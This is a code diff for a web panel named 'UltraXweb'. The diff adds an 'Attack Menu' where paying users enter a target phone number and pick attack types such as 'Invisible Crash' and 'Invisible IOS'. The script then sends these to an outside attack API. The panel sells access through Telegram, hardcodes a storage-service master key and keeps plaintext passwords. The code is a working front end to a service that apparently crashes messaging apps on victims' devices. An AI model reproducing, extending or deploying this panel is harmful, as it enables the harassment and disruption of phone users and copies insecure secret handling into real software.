@@ -6,263 +6,52 @@
   <title>UltraXweb</title>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
   <style>
-    :root {
-      --main: #4CAF50;
-      --second: #2E7D32;
-      --bg: #0a0a0a;
-      --text: #f2f2f2;
-    }
-
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Arial', sans-serif;
-    }
-
-    body {
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      position: relative;
-    }
-
-    /* Header */
-    .header {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      background: rgba(10, 10, 10, 0.9);
-      padding: 15px 20px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      z-index: 1000;
-      border-bottom: 1px solid var(--main);
-    }
-
-    .logo {
-      font-size: 1.2rem;
-      font-weight: bold;
-      color: var(--main);
-    }
-
-    .logo span {
-      color: #F1222;
-      font-weight: normal;
-    }
-
-    /* Hamburger Menu */
-    .hamburger {
-      cursor: pointer;
-      display: flex;
-      flex-direction: column;
-      gap: 5px;
-    }
-
-    .hamburger-line {
-      width: 25px;
-      height: 3px;
-      background-color: var(--main);
-      transition: all 0.3s;
-    }
-
-    /* Side Menu */
-    .side-menu {
-      position: fixed;
-      top: 0;
-      left: -300px;
-      width: 250px;
-      height: 100%;
-      background: rgba(10, 10, 10, 0.95);
-      border-right: 1px solid var(--main);
-      z-index: 999;
-      padding: 70px 20px 20px;
-      transition: all 0.3s;
-      overflow-y: auto;
-    }
-
-    .side-menu.active {
-      left: 0;
-    }
-
-    .menu-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      z-index: 998;
-      display: none;
-    }
-
-    .menu-overlay.active {
-      display: block;
-    }
-
-    .menu-item {
-      padding: 12px 15px;
-      border-radius: 8px;
-      margin-bottom: 5px;
-      cursor: pointer;
-      transition: all 0.3s;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .menu-item:hover {
-      background: rgba(76, 175, 80, 0.1);
-    }
-
-    .menu-item i {
-      width: 20px;
-      text-align: center;
-    }
-
-    /* Main Content */
-    .main-content {
-      padding: 80px 20px 20px;
-      max-width: 800px;
-      margin: 0 auto;
-    }
-
-    .card {
-      background: rgba(76, 175, 80, 0.03);
-      border: 1px solid rgba(76, 175, 80, 0.2);
-      border-radius: 15px;
-      padding: 20px;
-      margin-bottom: 20px;
-      backdrop-filter: blur(10px);
-    }
-
-    .card h2 {
-      color: var(--main);
-      margin-bottom: 15px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    /* Form Styles */
-    .form-group {
-      margin-bottom: 15px;
-    }
-
-    .form-group label {
-      display: block;
-      margin-bottom: 5px;
-      color: #aaa;
-    }
-
-    .form-control {
-      background: rgba(255, 255, 255, 0.05);
-      color: white;
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      border-radius: 8px;
-      padding: 10px;
-      width: 100%;
-    }
-
-    .btn {
-      padding: 10px 15px;
-      border-radius: 8px;
-      border: none;
-      background: var(--main);
-      color: white;
-      cursor: pointer;
-      transition: all 0.3s;
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .btn:hover {
-      background: var(--second);
-    }
-
-    .btn-telegram {
-      background: #0088cc;
-      margin-top: 15px;
-      width: 100%;
-      justify-content: center;
-    }
-
-    .btn-telegram:hover {
-      background: #0077b3;
-    }
-
-    /* Dashboard Info */
-    .info-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 15px;
-    }
-
-    .info-item {
-      background: rgba(76, 175, 80, 0.05);
-      border: 1px solid rgba(76, 175, 80, 0.1);
-      border-radius: 8px;
-      padding: 15px;
-    }
-
-    .info-label {
-      color: #aaa;
-      font-size: 0.9rem;
-      margin-bottom: 5px;
-    }
-
-    .info-value {
-      font-size: 1.1rem;
-    }
-
-    /* User List Table */
-    .user-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 15px;
-    }
-
-    .user-table th, .user-table td {
-      padding: 10px;
-      text-align: left;
-      border-bottom: 1px solid rgba(76, 175, 80, 0.2);
-    }
-
-    .user-table th {
-      color: var(--main);
-    }
-
-    /* Hidden class */
-    .hidden {
-      display: none;
-    }
-
-    /* Animations */
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .fade-in {
-      animation: fadeIn 0.3s forwards;
-    }
-
-    /* Loading spinner */
-    .spinner {
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+    :root{--main:#4CAF50;--second:#2E7D32;--bg:#0a0a0a;--text:#f2f2f2;}
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Arial',sans-serif;}
+    body{background:var(--bg);color:var(--text);min-height:100vh;position:relative;}
+    .header{position:fixed;top:0;left:0;width:100%;background:rgba(10,10,10,0.9);padding:15px 20px;display:flex;justify-content:space-between;align-items:center;z-index:1000;border-bottom:1px solid var(--main);}
+    .logo{font-size:1.2rem;font-weight:bold;color:var(--main);}
+    .logo span{color:#F1222;font-weight:normal;}
+    .hamburger{cursor:pointer;display:flex;flex-direction:column;gap:5px;}
+    .hamburger-line{width:25px;height:3px;background-color:var(--main);transition:all 0.3s;}
+    .side-menu{position:fixed;top:0;left:-300px;width:250px;height:100%;background:rgba(10,10,10,0.95);border-right:1px solid var(--main);z-index:999;padding:70px 20px 20px;transition:all 0.3s;overflow-y:auto;}
+    .side-menu.active{left:0;}
+    .menu-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:998;display:none;}
+    .menu-overlay.active{display:block;}
+    .menu-item{padding:12px 15px;border-radius:8px;margin-bottom:5px;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;gap:10px;}
+    .menu-item:hover{background:rgba(76,175,80,0.1);}
+    .menu-item i{width:20px;text-align:center;}
+    .main-content{padding:80px 20px 20px;max-width:800px;margin:0 auto;}
+    .card{background:rgba(76,175,80,0.03);border:1px solid rgba(76,175,80,0.2);border-radius:15px;padding:20px;margin-bottom:20px;backdrop-filter:blur(10px);}
+    .card h2{color:var(--main);margin-bottom:15px;display:flex;align-items:center;gap:10px;}
+    .form-group{margin-bottom:15px;}
+    .form-group label{display:block;margin-bottom:5px;color:#aaa;}
+    .form-control{background:rgba(255,255,255,0.05);color:white;border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:10px;width:100%;}
+    .btn{padding:10px 15px;border-radius:8px;border:none;background:var(--main);color:white;cursor:pointer;transition:all 0.3s;display:inline-flex;align-items:center;gap:8px;}
+    .btn:hover{background:var(--second);}
+    .btn-telegram{background:#0088cc;margin-top:15px;width:100%;justify-content:center;}
+    .btn-telegram:hover{background:#0077b3;}
+    .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px;}
+    .info-item{background:rgba(76,175,80,0.05);border:1px solid rgba(76,175,80,0.1);border-radius:8px;padding:15px;}
+    .info-label{color:#aaa;font-size:0.9rem;margin-bottom:5px;}
+    .info-value{font-size:1.1rem;}
+    .user-table{width:100%;border-collapse:collapse;margin-top:15px;}
+    .user-table th,.user-table td{padding:10px;text-align:left;border-bottom:1px solid rgba(76,175,80,0.2);}
+    .user-table th{color:var(--main);}
+    .hidden{display:none;}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
+    .fade-in{animation:fadeIn 0.3s forwards;}
+    .spinner{animation:spin 1s linear infinite;}
+    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+    .attack-options{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:15px;}
+    .attack-option{padding:10px;border:1px solid rgba(76,175,80,0.3);border-radius:8px;cursor:pointer;text-align:center;}
+    .attack-option:hover{background:rgba(76,175,80,0.1);}
+    .api-status{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:5px;}
+    .api-online{background:#4CAF50;}
+    .api-offline{background:#f44336;}
   </style>
 </head>
 <body>
-  <!-- Header with Hamburger (hidden on login screen) -->
   <div class="header hidden" id="header">
     <div class="hamburger" id="hamburger">
       <div class="hamburger-line"></div>
@@ -270,20 +59,15 @@
       <div class="hamburger-line"></div>
     </div>
     <div class="logo">UltraXweb</div>
-    <div></div> <!-- Spacer -->
+    <div></div>
   </div>
 
-  <!-- Side Menu -->
-  <div class="side-menu" id="sideMenu">
-    <!-- Menu items will be populated by JavaScript -->
-  </div>
+  <div class="side-menu" id="sideMenu"></div>
   <div class="menu-overlay" id="menuOverlay"></div>
 
-  <!-- Main Content -->
   <div class="main-content">
-    <!-- Login Form -->
     <div class="card" id="loginCard">
-      <h2 style="text-align: center;"><i class="fas fa-sign-in-alt"></i> Login</h2>
+      <h2 style="text-align:center;"><i class="fas fa-sign-in-alt"></i> Login</h2>
       <div class="form-group">
         <label>Username</label>
         <input type="text" id="username" class="form-control">
@@ -292,19 +76,11 @@
         <label>Password</label>
         <input type="password" id="password" class="form-control">
       </div>
-      <button class="btn" onclick="login()" id="loginBtn">
-        <i class="fas fa-sign-in-alt"></i> Login
-      </button>
-      
-      <!-- Buy Access via Telegram Button -->
-      <a href="https://t.me/dilxVXII" target="_blank" class="btn btn-telegram">
-        <i class="fab fa-telegram"></i> Buy Access via Telegram
-      </a>
-      
-      <div id="loginResult" style="margin-top: 15px; text-align: center;"></div>
+      <button class="btn" onclick="login()" id="loginBtn"><i class="fas fa-sign-in-alt"></i> Login</button>
+      <a href="https://t.me/dilxVXII" target="_blank" class="btn btn-telegram"><i class="fab fa-telegram"></i> Buy Access via Telegram</a>
+      <div id="loginResult" style="margin-top:15px;text-align:center;"></div>
     </div>
 
-    <!-- Dashboard -->
     <div class="card hidden" id="dashboard">
       <h2><i class="fas fa-tachometer-alt"></i> Dashboard</h2>
       <div class="info-grid">
@@ -327,7 +103,6 @@
       </div>
     </div>
 
-    <!-- My Info -->
     <div class="card hidden fade-in" id="myInfo">
       <h2><i class="fas fa-user"></i> My Info</h2>
       <div class="form-group">
@@ -342,16 +117,34 @@
         <label>Reset Password</label>
         <input type="password" id="newPassword" class="form-control" placeholder="New password">
       </div>
-      <button class="btn" onclick="resetPassword()" id="resetPassBtn">
-        <i class="fas fa-key"></i> Reset Password
-      </button>
-      <button class="btn" onclick="hideAllMenus()" style="margin-left: 10px;">
-        <i class="fas fa-times"></i> Close
-      </button>
-      <div id="myInfoResult" style="margin-top: 15px;"></div>
+      <button class="btn" onclick="resetPassword()" id="resetPassBtn"><i class="fas fa-key"></i> Reset Password</button>
+      <button class="btn" onclick="hideAllMenus()" style="margin-left:10px;"><i class="fas fa-times"></i> Close</button>
+      <div id="myInfoResult" style="margin-top:15px;"></div>
     </div>
 
-    <!-- Admin: Create User -->
+    <div class="card hidden fade-in" id="attackMenu">
+      <h2><i class="fas fa-bug"></i> Attack Menu</h2>
+      <div class="form-group">
+        <label>Target Number</label>
+        <input type="text" id="targetNumber" class="form-control" placeholder="628xxx">
+      </div>
+      <div class="form-group">
+        <label>Attack Type</label>
+        <select id="attackType" class="form-control">
+          <option value="invisible">Invisible Crash</option>
+          <option value="invisible_ios">Invisible IOS</option>
+          <option value="delay_msc">Delay MSC</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>API Status: <span id="apiStatusText">Checking...</span> <span id="apiStatusDot" class="api-status"></span></label>
+      </div>
+      <button class="btn" onclick="checkApiStatus()"><i class="fas fa-sync-alt"></i> Check API</button>
+      <button class="btn" onclick="launchAttack()" id="attackBtn"><i class="fas fa-rocket"></i> Launch Attack</button>
+      <button class="btn" onclick="hideAllMenus()" style="margin-left:10px;"><i class="fas fa-times"></i> Close</button>
+      <div id="attackResult" style="margin-top:15px;"></div>
+    </div>
+
     <div class="card hidden fade-in" id="adminCreateUser">
       <h2><i class="fas fa-user-plus"></i> Create User</h2>
       <div class="form-group">
@@ -374,19 +167,14 @@
         <label>Expiration Days</label>
         <input type="number" id="newUserDays" class="form-control" min="1" value="30">
       </div>
-      <button class="btn" onclick="createUser()" id="createUserBtn">
-        <i class="fas fa-save"></i> Create User
-      </button>
-      <button class="btn" onclick="hideAllMenus()" style="margin-left: 10px;">
-        <i class="fas fa-times"></i> Close
-      </button>
-      <div id="createUserResult" style="margin-top: 15px;"></div>
+      <button class="btn" onclick="createUser()" id="createUserBtn"><i class="fas fa-save"></i> Create User</button>
+      <button class="btn" onclick="hideAllMenus()" style="margin-left:10px;"><i class="fas fa-times"></i> Close</button>
+      <div id="createUserResult" style="margin-top:15px;"></div>
     </div>
 
-    <!-- Admin: List Users -->
     <div class="card hidden fade-in" id="adminListUsers">
       <h2><i class="fas fa-users"></i> User List</h2>
-      <div style="overflow-x: auto;">
+      <div style="overflow-x:auto;">
         <table class="user-table">
           <thead>
             <tr>
@@ -394,70 +182,44 @@
               <th>Role</th>
               <th>Expired</th>
               <th>Device ID</th>
+              <th>Action</th>
             </tr>
           </thead>
-          <tbody id="userListBody">
-            <!-- Users will be populated here -->
-          </tbody>
+          <tbody id="userListBody"></tbody>
         </table>
       </div>
-      <button class="btn" onclick="hideAllMenus()" style="margin-top: 15px;">
-        <i class="fas fa-times"></i> Close
-      </button>
+      <button class="btn" onclick="hideAllMenus()" style="margin-top:15px;"><i class="fas fa-times"></i> Close</button>
     </div>
   </div>
 
   <script>
-    // JSONBin configuration
-    const BIN_ID = "688384cdae596e708fbb97e4"; // Replace with your actual bin ID
-    const API_KEY = "$2a$10$55IAjRl7i3QlilxdTPmqx.5/Idiemz453V9zHKc76Z9q4jDPhvL.C"; // Replace with your actual API key
-    const headers = {
-      "Content-Type": "application/json",
-      "X-Master-Key": API_KEY
-    };
-
-    // Global variables
+    const BIN_ID = "688384cdae596e708fbb97e4";
+    const API_KEY = "$2a$10$55IAjRl7i3QlilxdTPmqx.5/Idiemz453V9zHKc76Z9q4jDPhvL.C";
+    const headers = {"Content-Type":"application/json","X-Master-Key":API_KEY};
+    const ATTACK_API_URL = "https://cella-why.mydigital-store.me/permen";
+    
     let currentUser = null;
-    let localDeviceId = localStorage.getItem('device_id');
-    if (!localDeviceId) {
-      localDeviceId = generateDeviceId();
-      localStorage.setItem('device_id', localDeviceId);
-    }
+    let localDeviceId = localStorage.getItem('device_id') || generateDeviceId();
+    localStorage.setItem('device_id', localDeviceId);
+    let apiStatus = false;
 
-    // Generate device ID
     function generateDeviceId() {
       return Math.random().toString(36).substring(2, 15);
     }
 
-    // DOM elements
-    const header = document.getElementById('header');
-    const hamburger = document.getElementById('hamburger');
-    const sideMenu = document.getElementById('sideMenu');
-    const menuOverlay = document.getElementById('menuOverlay');
-    const loginCard = document.getElementById('loginCard');
-    const dashboard = document.getElementById('dashboard');
-
-    // Initialize
     document.addEventListener('DOMContentLoaded', () => {
-      // Check if user is already logged in
       const user = JSON.parse(localStorage.getItem('currentUser'));
-      if (user) {
-        currentUser = user;
-        showDashboard();
-      }
-
-      // Hamburger menu click event
-      hamburger.addEventListener('click', toggleMenu);
-      menuOverlay.addEventListener('click', toggleMenu);
+      if (user) { currentUser = user; showDashboard(); }
+      document.getElementById('hamburger').addEventListener('click', toggleMenu);
+      document.getElementById('menuOverlay').addEventListener('click', toggleMenu);
+      checkApiStatus();
     });
 
-    // Toggle side menu
     function toggleMenu() {
-      sideMenu.classList.toggle('active');
-      menuOverlay.classList.toggle('active');
+      document.getElementById('sideMenu').classList.toggle('active');
+      document.getElementById('menuOverlay').classList.toggle('active');
     }
 
-    // Hide all menu cards
     function hideAllMenus() {
       document.querySelectorAll('.card').forEach(card => {
         if (!card.id.includes('loginCard') && !card.id.includes('dashboard')) {
@@ -467,38 +229,33 @@
       toggleMenu();
     }
 
-    // Show specific menu card
     function showMenu(menuId) {
       hideAllMenus();
       document.getElementById(menuId).classList.remove('hidden');
-      
-      // If showing user list, load users
-      if (menuId === 'adminListUsers') {
-        loadUserList();
-      }
+      if (menuId === 'adminListUsers') loadUserList();
     }
 
-    // Update side menu based on user role
     function updateSideMenu() {
+      const sideMenu = document.getElementById('sideMenu');
       sideMenu.innerHTML = '';
-      
       if (!currentUser) return;
 
-      // Common menu items
-      const menuItems = [];
-      
-      menuItems.push(
-        { icon: 'fa-user', text: 'My Info', action: () => showMenu('myInfo') }
-      );
+      const menuItems = [
+        {icon:'fa-user',text:'My Info',action:()=>showMenu('myInfo')},
+        {icon:'fa-bug',text:'Attack Menu',action:()=>showMenu('attackMenu')}
+      ];
 
       if (currentUser.role === 'admin') {
         menuItems.push(
-          { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') },
-          { icon: 'fa-users', text: 'List Users', action: () => showMenu('adminListUsers') }
+          {icon:'fa-user-plus',text:'Create User',action:()=>showMenu('adminCreateUser')},
+          {icon:'fa-users',text:'List Users',action:()=>showMenu('adminListUsers')}
+        );
+      } else if (currentUser.role === 'reseller') {
+        menuItems.push(
+          {icon:'fa-user-plus',text:'Create User',action:()=>showMenu('adminCreateUser')}
         );
       }
 
-      // Add menu items to side menu
       menuItems.forEach(item => {
         const menuItem = document.createElement('div');
         menuItem.className = 'menu-item';
@@ -507,7 +264,6 @@
         sideMenu.appendChild(menuItem);
       });
 
-      // Add logout button
       const logoutItem = document.createElement('div');
       logoutItem.className = 'menu-item';
       logoutItem.innerHTML = '<i class="fas fa-sign-out-alt"></i> Logout';
@@ -517,34 +273,22 @@
       sideMenu.appendChild(logoutItem);
     }
 
-    // Get users from JSONBin
     async function getUsers() {
       try {
-        const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
-        const data = await response.json();
-        return data.record;
-      } catch (error) {
-        console.error('Error fetching users:', error);
-        return [];
-      }
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {headers});
+        return (await res.json()).record;
+      } catch (e) { console.error('Error fetching users:', e); return []; }
     }
 
-    // Update users in JSONBin
     async function updateUsers(users) {
       try {
-        const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-          method: 'PUT',
-          headers,
-          body: JSON.stringify(users)
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+          method: 'PUT', headers, body: JSON.stringify(users)
         });
-        return await response.json();
-      } catch (error) {
-        console.error('Error updating users:', error);
-        return null;
-      }
+        return await res.json();
+      } catch (e) { console.error('Error updating users:', e); return null; }
     }
 
-    // Login function
     async function login() {
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
@@ -557,7 +301,6 @@
         return;
       }
 
-      // Show loading state
       loginBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Logging in...';
       loginBtn.disabled = true;
 
@@ -571,23 +314,20 @@
           return;
         }
 
-        // Check if account is already in use on another device
         if (user.device_id && user.device_id !== localDeviceId) {
           loginResult.innerHTML = 'Account is already in use on another device';
           loginResult.style.color = '#f44336';
           return;
         }
 
-        // Update user device ID
         user.device_id = localDeviceId;
-        const updatedUsers = users.map(u => u.username === user.username ? user : u);
-        await updateUsers(updatedUsers);
+        await updateUsers(users.map(u => u.username === user.username ? user : u));
 
         currentUser = user;
         localStorage.setItem('currentUser', JSON.stringify(user));
         showDashboard();
-      } catch (error) {
-        loginResult.innerHTML = 'Login failed: ' + error.message;
+      } catch (e) {
+        loginResult.innerHTML = 'Login failed: ' + e.message;
         loginResult.style.color = '#f44336';
       } finally {
         loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Login';
@@ -595,54 +335,44 @@
       }
     }
 
-    // Show dashboard
     function showDashboard() {
-      // Show header and hide login
-      header.classList.remove('hidden');
-      loginCard.classList.add('hidden');
-      dashboard.classList.remove('hidden');
+      document.getElementById('header').classList.remove('hidden');
+      document.getElementById('loginCard').classList.add('hidden');
+      document.getElementById('dashboard').classList.remove('hidden');
       
-      // Update dashboard info
       document.getElementById('infoUsername').textContent = currentUser.username;
       document.getElementById('infoRole').textContent = currentUser.role;
       document.getElementById('infoDeviceId').textContent = localDeviceId;
       document.getElementById('infoExpired').textContent = currentUser.expired || 'N/A';
       
-      // Update My Info
       document.getElementById('myInfoUsername').value = currentUser.username;
       document.getElementById('myInfoRole').value = currentUser.role;
       
       updateSideMenu();
     }
 
-    // Logout function
     async function logout() {
       try {
         if (currentUser) {
           const users = await getUsers();
-          const updatedUsers = users.map(u => {
-            if (u.username === currentUser.username) {
-              return { ...u, device_id: '' };
-            }
+          await updateUsers(users.map(u => {
+            if (u.username === currentUser.username) return {...u, device_id: ''};
             return u;
           });
-          await updateUsers(updatedUsers);
         }
-      } catch (error) {
-        console.error('Error during logout:', error);
-      } finally {
+      } catch (e) { console.error('Error during logout:', e); }
+      finally {
         currentUser = null;
         localStorage.removeItem('currentUser');
-        header.classList.add('hidden');
-        loginCard.classList.remove('hidden');
-        dashboard.classList.add('hidden');
+        document.getElementById('header').classList.add('hidden');
+        document.getElementById('loginCard').classList.remove('hidden');
+        document.getElementById('dashboard').classList.add('hidden');
         hideAllMenus();
         document.getElementById('username').value = '';
         document.getElementById('password').value = '';
       }
     }
 
-    // Reset password
     async function resetPassword() {
       const newPassword = document.getElementById('newPassword').value;
       const resetPassBtn = document.getElementById('resetPassBtn');
@@ -654,30 +384,25 @@
         return;
       }
 
-      // Show loading state
       resetPassBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Updating...';
       resetPassBtn.disabled = true;
 
       try {
         const users = await getUsers();
         const updatedUsers = users.map(u => {
-          if (u.username === currentUser.username) {
-            return { ...u, password: newPassword };
-          }
+          if (u.username === currentUser.username) return {...u, password: newPassword};
           return u;
         });
 
         await updateUsers(updatedUsers);
-
-        // Update current user
         currentUser.password = newPassword;
         localStorage.setItem('currentUser', JSON.stringify(currentUser));
 
         myInfoResult.innerHTML = 'Password updated successfully';
         myInfoResult.style.color = 'var(--main)';
         document.getElementById('newPassword').value = '';
-      } catch (error) {
-        myInfoResult.innerHTML = 'Error updating password: ' + error.message;
+      } catch (e) {
+        myInfoResult.innerHTML = 'Error updating password: ' + e.message;
         myInfoResult.style.color = '#f44336';
       } finally {
         resetPassBtn.innerHTML = '<i class="fas fa-key"></i> Reset Password';
@@ -685,7 +410,6 @@
       }
     }
 
-    // Create new user (admin only)
     async function createUser() {
       const username = document.getElementById('newUsername').value;
       const password = document.getElementById('newUserPassword').value;
@@ -700,45 +424,41 @@
         return;
       }
 
-      // Show loading state
+      if (currentUser.role === 'reseller' && role !== 'user') {
+        createUserResult.innerHTML = 'Resellers can only create user accounts';
+        createUserResult.style.color = '#f44336';
+        return;
+      }
+
       createUserBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Creating...';
       createUserBtn.disabled = true;
 
       try {
         const users = await getUsers();
-        
-        // Check if username already exists
         if (users.some(u => u.username === username)) {
           createUserResult.innerHTML = 'Username already exists';
           createUserResult.style.color = '#f44336';
           return;
         }
 
-        // Calculate expiration date
         const expiredDate = new Date();
         expiredDate.setDate(expiredDate.getDate() + days);
 
         const newUser = {
-          username,
-          password,
-          role,
-          telegram_id: null,
-          device_id: '',
+          username, password, role,
+          telegram_id: null, device_id: '',
           expired: expiredDate.toISOString().split('T')[0]
         };
 
-        const updatedUsers = [...users, newUser];
-        await updateUsers(updatedUsers);
+        await updateUsers([...users, newUser]);
 
         createUserResult.innerHTML = `User ${username} created successfully`;
         createUserResult.style.color = 'var(--main)';
-        
-        // Clear form
         document.getElementById('newUsername').value = '';
         document.getElementById('newUserPassword').value = '';
         document.getElementById('newUserDays').value = '30';
-      } catch (error) {
-        createUserResult.innerHTML = 'Error creating user: ' + error.message;
+      } catch (e) {
+        createUserResult.innerHTML = 'Error creating user: ' + e.message;
         createUserResult.style.color = '#f44336';
       } finally {
         createUserBtn.innerHTML = '<i class="fas fa-save"></i> Create User';
@@ -746,16 +466,14 @@
       }
     }
 
-    // Load user list for admin
     async function loadUserList() {
       const userListBody = document.getElementById('userListBody');
-      userListBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Loading users...</td></tr>';
+      userListBody.innerHTML = '<tr><td colspan="5" style="text-align:center;">Loading users...</td></tr>';
 
       try {
         const users = await getUsers();
-        
         if (users.length === 0) {
-          userListBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">No users found</td></tr>';
+          userListBody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No users found</td></tr>';
           return;
         }
 
@@ -767,11 +485,89 @@
             <td>${user.role}</td>
             <td>${user.expired || 'N/A'}</td>
             <td>${user.device_id || 'Not logged in'}</td>
+            <td>
+              ${currentUser.role === 'admin' ? `<button class="btn" onclick="deleteUser('${user.username}')" style="padding:5px 8px;font-size:0.8rem;"><i class="fas fa-trash"></i></button>` : ''}
+            </td>
           `;
           userListBody.appendChild(row);
         });
-      } catch (error) {
-        userListBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: #f44336;">Error loading users</td></tr>';
+      } catch (e) {
+        userListBody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#f44336;">Error loading users</td></tr>';
+      }
+    }
+
+    async function deleteUser(username) {
+      if (!confirm(`Are you sure you want to delete ${username}?`)) return;
+      
+      try {
+        const users = await getUsers();
+        const updatedUsers = users.filter(u => u.username !== username);
+        await updateUsers(updatedUsers);
+        loadUserList();
+      } catch (e) {
+        alert('Error deleting user: ' + e.message);
+      }
+    }
+
+    async function checkApiStatus() {
+      const apiStatusDot = document.getElementById('apiStatusDot');
+      const apiStatusText = document.getElementById('apiStatusText');
+      
+      apiStatusDot.className = 'api-status';
+      apiStatusText.textContent = 'Checking...';
+      
+      try {
+        const res = await fetch(ATTACK_API_URL);
+        apiStatus = res.ok;
+        if (apiStatus) {
+          apiStatusDot.classList.add('api-online');
+          apiStatusText.textContent = 'Online';
+        } else {
+          apiStatusDot.classList.add('api-offline');
+          apiStatusText.textContent = 'Offline';
+        }
+      } catch (e) {
+        apiStatus = false;
+        apiStatusDot.classList.add('api-offline');
+        apiStatusText.textContent = 'Offline';
+      }
+      return apiStatus;
+    }
+
+    async function launchAttack() {
+      const targetNumber = document.getElementById('targetNumber').value;
+      const attackType = document.getElementById('attackType').value;
+      const attackBtn = document.getElementById('attackBtn');
+      const attackResult = document.getElementById('attackResult');
+      
+      if (!targetNumber) {
+        attackResult.innerHTML = 'Please enter target number';
+        attackResult.style.color = '#f44336';
+        return;
+      }
+      
+      if (!await checkApiStatus()) {
+        attackResult.innerHTML = 'API is currently offline';
+        attackResult.style.color = '#f44336';
+        return;
+      }
+      
+      attackBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Attacking...';
+      attackBtn.disabled = true;
+      
+      try {
+        const res = await fetch(`${ATTACK_API_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${attackType}`);
+        if (!res.ok) throw new Error("Failed to connect to server");
+        const data = await res.json();
+        
+        attackResult.innerHTML = `Attack launched successfully: ${JSON.stringify(data)}`;
+        attackResult.style.color = 'var(--main)';
+      } catch (e) {
+        attackResult.innerHTML = 'Attack failed: ' + e.message;
+        attackResult.style.color = '#f44336';
+      } finally {
+        attackBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
+        attackBtn.disabled = false;
       }
     }
   </script>
